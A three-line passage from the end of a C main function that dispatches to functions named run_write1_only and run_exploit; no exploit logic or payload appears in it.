        return run_write1_only();
    return run_exploit(argc, argv);
}
